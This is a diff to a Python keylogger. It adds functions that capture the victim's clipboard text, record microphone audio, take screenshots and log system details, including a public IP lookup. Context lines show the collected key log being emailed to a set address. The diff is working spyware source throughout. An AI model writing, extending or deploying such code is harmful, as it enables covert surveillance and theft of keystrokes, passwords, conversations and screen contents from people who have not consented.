@@ -38,6 +38,11 @@ from PIL import ImageGrab
 #Default Variable
 keys_information = "key_log.txt"
 system_information = "system_information.txt"
+clipboard_information = "clipboard.txt"
+audio_information = "audio.wav"
+screenshot_information = "screenschot.png"
+recorded_microphone_time = 10
+
 file_path = "Directory where you want to save the file of log"
 extend = "\\"
 email_address = "example@gmail.com"
@@ -82,7 +87,59 @@ def send_the_email(filename, attachment, to_the_given_address):
 
 send_email(keys_information, file_path + extend + keys_information,to_the_given_address)
 
-def 
+def computer_information():
+    with open(file_path + extend + system_information ,"a") as comp_info:
+        hostname = socket.gethostname()
+        IP_Address = socket.gethostbyname(hostname)
+        # Getting the Public Ip
+        try:
+            public_ip = get("https://api.ipify.org").text
+            comp_info.write("Public IP Address: " + public_ip)
+            
+        except Exception:
+            comp_info.write("Couldn't get the Public IP Address")
+            
+        comp_info.write("Processor: " + (platform.processor()) + '\n')
+        comp_info.write("System: " + platform.system() + " " + platform.version() + '\n')
+        comp_info.write("Machine: " + platform.machine() + "\n")
+        comp_info.write("HostName: " + hostname + "\n")
+        comp_info.write("Private IP Address" + IP_Address + "\n")
+        
+computer_information() 
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as clip_capture:
+        # Capturing only the text not other file format and doesn't make our script to stop
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            clip_capture.write("Clipboard Data: \n" + pasted_data)
+            
+        except:
+            #For Audio file and other types of files other than text
+            clip_capture.write("Clipboard could not be copied")
+            
+copy_clipboard()            
+
+def microphone():
+    sampling_frequency = 44100
+    seconds_to_capture = recorded_microphone_time 
+    
+    myrecording = sd.rec(int(seconds_to_capture * sampling_frequency), samplerate=sampling_frequency, channels=2)
+    sd.wait()
+    write(file_path + extend + audio_information, sampling_frequency, myrecording)
+            
+microphone()        
+            
+def ScreenShot():
+    capturing_Image = ImageGrab.grab()
+    capturing_Image.save(file_path + extend + screenshot_information)
+    
+    
+        
+ScreenShot()
+        
+            
     
     
     
